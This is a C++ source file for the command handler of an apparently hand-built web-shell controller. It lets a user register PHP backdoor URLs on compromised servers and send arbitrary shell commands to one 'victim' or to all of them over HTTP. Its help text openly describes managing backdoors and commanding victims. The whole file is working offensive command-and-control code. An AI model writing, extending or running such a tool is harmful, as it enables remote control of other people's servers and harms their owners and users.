
#include <vector>
#include <iostream>

#include "commands.h"
#include "config_utils.h"
#include "split.h"
#include "web.h"

using namespace std;

CommandCenter::CommandCenter() {}
CommandCenter::CommandCenter(const std::string& cmd) {
	current_cmd = cmd;
}

CommandCenter::~CommandCenter() {}

command_types CommandCenter::ident_type() {
	if (current_cmd == "")
		return bad_type;

	vector<string> splitted_command = split(current_cmd, ' ');

	if (splitted_command[0] == "exit")
		return exit_type;
	if (splitted_command[0] == "add")
		return add_shell_type;
	if (splitted_command[0] == "help")
		return help_type;
	if (splitted_command[0] == "remove")
		return remove_shell_type;
	if (splitted_command[0] == "show")
		return show_shells_type;
	if (splitted_command[0] == "sendto")
		return sendto_commad_type;
	if (splitted_command[0] == "send")
		return send_command_type;
	if (splitted_command[0] == "clear")
		return clear_command_type;

	return bad_type;
}

void CommandCenter::set_command(const std::string& cmd)
{
	current_cmd = cmd;
}

void CommandCenter::show_help() {
	cout << endl;
	cout << "help -> show this message" << endl; // +
	cout << "exit -> exit" << endl; // +
	cout << "clear -> clear screen" << endl; // +
	cout << "add http(s)://url.here/backdoor.php?cmd= -> add backdoor to your base" << endl; // +
	cout << "show -> show all your backdoors with their IDs" << endl; // +
	cout << "remove [id] -> remove backdoor with id [id] from base" << endl; // +
	cout << "sendto [id] [command] -> send command to victim with id [id]" << endl; //+
	cout << "send [command] -> send command to all victims" << endl; // +
}

void CommandCenter::execute_command() {
	switch (ident_type()) {
	case help_type:
		show_help();
		break;
	case exit_type:
		exit(0);
	case add_shell_type:
		Config.add_backdoor(current_cmd);
		break;
	case show_shells_type: {
		cout << endl;
		cout << "ID \tBackdoor" << endl << endl;
		vector<string> shells = Config.get_backdoors();
		for (size_t i = 0; i < shells.size(); i++)
			cout << shells[i] << endl;
		cout << endl;
		break;
	}
	case remove_shell_type:
		Config.remove_backdoor(current_cmd);
		break;
	case clear_command_type:
		system("clear");
		break;
	case sendto_commad_type: {
		string url = Config.get_current_backdoor(split(current_cmd, ' ')[1]);
		if (url == "No backdoor with id " + split(current_cmd, ' ')[1])
		{
			cout << url << endl;
			break;
		}
		url = split(url, '\t')[1] + split(current_cmd, ' ')[2];
		cWeb.SetURL(url);
		cWeb.SendRequest();
		cout << cWeb.GetResult() << endl;
		break;
	}
	case send_command_type: {
		vector<string> backdoors = Config.get_backdoors();
		for (size_t i = 0; i < backdoors.size(); i++) {
			string url = split(backdoors[i], '\t')[1] + split(current_cmd, ' ')[1];
			cWeb.SetURL(url);
			cWeb.SendRequest();
			cout << cWeb.GetResult() << endl;
		}
		break;
	}
	case bad_type:
		cout << "Unknown command!" << endl;
		break;
	}
}
